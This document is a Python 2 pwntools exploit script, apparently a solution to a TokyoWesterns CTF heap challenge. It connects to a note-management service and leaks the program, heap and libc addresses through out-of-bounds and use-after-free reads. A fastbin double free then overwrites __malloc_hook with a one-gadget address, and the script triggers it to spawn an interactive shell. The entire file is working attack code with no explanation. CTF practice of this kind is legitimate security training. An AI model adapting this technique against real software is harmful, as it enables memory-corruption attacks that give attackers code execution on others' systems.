#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

e = ELF('./libc.so.6')
r = remote('127.0.0.1', 7122)
#r = remote('pwn1.chal.ctf.westerns.tokyo', 16317)

def menu():
	r.recvuntil('Your choice:')

def add(sz, nt):
	menu()
	r.send('1\n')
	r.recvuntil('size of note.')
	r.send(str(sz)+'\n')
	r.recvuntil('content of the note.')
	r.send(nt)

def dele(idx):
	menu()
	r.send('3\n')
	r.recvuntil('index of note.')
	r.send(str(idx)+'\n')

def show(idx):
	menu()
	r.send('2\n')
	r.recvuntil('index of note.')
	r.send(str(idx)+'\n')
	return r.recvuntil('+=+=', drop=True)

x = show(-11)
text_base = u64(x[9:-1].ljust(8, '\x00')) - 0x202008
print 'text:', hex(text_base)

add(100, 'a'*99)
add(100, 'b'*99)
dele(0)
dele(1)
add(100, '\n')
x = show(0)
heap_base = u64(x[9:-1].ljust(8, '\x00'))-0xa
dele(0)
print 'heap:', hex(heap_base)

puts_got = text_base + 0x201f90
notes = text_base + 0x202060

# set for double free
add(100, flat(puts_got, heap_base+0x10))
off = heap_base + 0x80 - notes
idx = off/8
print 'puts got:', hex(puts_got)
print 'notes:', hex(notes)
print idx
x = show(idx)
libc_base = u64(x[9:-1].ljust(8, '\x00')) - e.symbols['puts']
dele(0)
print 'libc:', hex(libc_base)

# double free
dele(idx+1)

__malloc_hook = e.symbols['__malloc_hook']
print 'malloc hook:', hex(libc_base+__malloc_hook)
add(100, p64(libc_base+__malloc_hook-3-16))
add(100, '\n')
add(100, '\n')

# get chunk on __malloc_hook
one_gadget = 0xf0274
print 'one gadget:', hex(libc_base+one_gadget)
add(100, 'G'*3+p64(libc_base+one_gadget))

# trigger __malloc_hook
# double free calls malloc
dele(0)
dele(2)
r.interactive() 


